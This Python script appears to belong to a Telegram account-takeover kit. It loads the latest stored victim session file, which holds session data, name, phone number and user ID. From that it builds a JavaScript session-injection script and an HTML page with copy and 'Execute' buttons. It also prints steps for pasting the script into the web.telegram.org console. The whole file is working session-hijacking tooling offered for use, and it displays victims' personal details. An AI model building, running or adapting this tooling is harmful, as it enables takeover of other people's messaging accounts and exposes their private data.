#!/usr/bin/env python3
"""
Generate Working Script from Current/Most Recent Session

This script generates a JavaScript script from the most recent stored credential session
and saves it locally without sending to Telegram.
"""

import os
import json
from datetime import datetime
from utils.credentials_manager import credentials_manager

def generate_current_session_script():
    """Generate working format script from the most recent session"""
    
    # Get all JSON credentials files
    all_files = credentials_manager.list_credentials_files()
    json_files = [f for f in all_files if f['filename'].endswith('.json')]
    
    if not json_files:
        print("❌ No JSON credential files found")
        return None
    
    # Sort by modification time to get the most recent
    json_files.sort(key=lambda x: x['modified'], reverse=True)
    most_recent_file = json_files[0]
    
    print(f"📁 Found {len(json_files)} credential files")
    print(f"🎯 Using most recent: {most_recent_file['filename']}")
    print(f"⏰ Modified: {most_recent_file['modified']}")
    print("=" * 60)
    
    # Load the credentials
    filename = most_recent_file['filename']
    credentials = credentials_manager.load_credentials(filename)
    if not credentials or 'session_data' not in credentials:
        print(f"❌ No valid session data found in {filename}")
        return None
    
    session_data = credentials['session_data']
    user_info = credentials.get('user_info', {})
    
    print(f"✅ Valid credential data found")
    print(f"👤 User: {user_info.get('first_name', 'Unknown')} {user_info.get('last_name', '')} (+{user_info.get('phone', 'Unknown')})")
    print(f"🆔 User ID: {user_info.get('id', 'Unknown')}")
    print(f"🔑 Auth Type: REAL")
    print(f"📦 Session Data Keys: {list(session_data.keys())}")
    
    # Generate the working format script
    script_content = credentials_manager.generate_working_format_script(session_data)
    
    # Save the script
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    user_id = user_info.get('id', 'unknown')
    script_filename = f"current_session_script_{user_id}_{timestamp}.js"
    script_filepath = os.path.join("credentials", script_filename)
    
    with open(script_filepath, 'w', encoding='utf-8') as f:
        f.write(script_content)
    
    print(f"✅ Working script generated: {script_filename}")
    print(f"📁 Saved to: {script_filepath}")
    print(f"📏 Script length: {len(script_content)} characters")
    
    # Also save as HTML file for easy access
    html_filename = f"current_session_script_{user_id}_{timestamp}.html"
    html_filepath = os.path.join("static", "scripts", html_filename)
    
    # Ensure the scripts directory exists
    os.makedirs(os.path.join("static", "scripts"), exist_ok=True)
    
    # Create HTML content
    html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Current Session Script - {user_info.get('first_name', 'User')}</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
        }}
        .container {{
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }}
        .header {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .header h1 {{
            color: #fff;
            margin: 0;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
        }}
        .info {{
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
        }}
        .info h3 {{
            margin-top: 0;
            color: #fff;
        }}
        .info p {{
            margin: 5px 0;
            font-size: 1.1em;
        }}
        .script-container {{
            background: #1e1e1e;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 30px;
        }}
        .script-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }}
        .script-header h3 {{
            margin: 0;
            color: #fff;
        }}
        .copy-btn {{
            background: #4CAF50;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }}
        .script-content {{
            background: #2d2d2d;
            border-radius: 5px;
            padding: 15px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            line-height: 1.4;
            color: #e6e6e6;
            max-height: 400px;
            overflow-y: auto;
        }}
        .execute-btn {{
            background: #2196F3;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            margin-top: 15px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 Current Session Script</h1>
        </div>
        
        <div class="info">
            <h3>📋 Session Information</h3>
            <p><strong>Name:</strong> {user_info.get('first_name', 'N/A')} {user_info.get('last_name', '')}</p>
            <p><strong>Phone:</strong> +{user_info.get('phone', 'Unknown')}</p>
            <p><strong>User ID:</strong> {user_info.get('id', 'Unknown')}</p>
            <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Source:</strong> {filename}</p>
        </div>
        
        <div class="script-container">
            <div class="script-header">
                <h3>🔧 Script Content</h3>
                <button class="copy-btn" onclick="copyScript()">📋 Copy Script</button>
            </div>
            <div class="script-content" id="scriptContent">{script_content}</div>
            <button class="execute-btn" onclick="executeScript()">▶️ Execute Script</button>
        </div>
    </div>

    <script>
        function copyScript() {{
            const scriptContent = document.getElementById('scriptContent').textContent;
            navigator.clipboard.writeText(scriptContent).then(function() {{
                const btn = document.querySelector('.copy-btn');
                const originalText = btn.textContent;
                btn.textContent = '✅ Copied!';
                setTimeout(function() {{
                    btn.textContent = originalText;
                }}, 2000);
            }});
        }}
        
        function executeScript() {{
            window.open('https://web.telegram.org/a/', '_blank');
            alert('Opening web.telegram.org/a/ in a new tab. Please copy and paste the script in the console.');
        }}
    </script>
</body>
</html>"""
    
    with open(html_filepath, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    print(f"✅ HTML file generated: {html_filename}")
    print(f"📁 HTML saved to: {html_filepath}")
    
    # Create URL for the HTML file
    base_url = os.getenv('WEBAPP_URL', 'http://localhost:5000')
    script_url = f"{base_url}/static/scripts/{html_filename}"
    
    print(f"🔗 HTML URL: {script_url}")
    print("=" * 60)
    print("🎉 Script generation complete!")
    print("📝 Instructions:")
    print("1. Open the HTML URL above in your browser")
    print("2. Click 'Copy Script' button")
    print("3. Open https://web.telegram.org/a/ in your browser")
    print("4. Press F12 → Console tab")
    print("5. Paste and press Enter")
    
    return script_filepath

if __name__ == "__main__":
    generate_current_session_script() 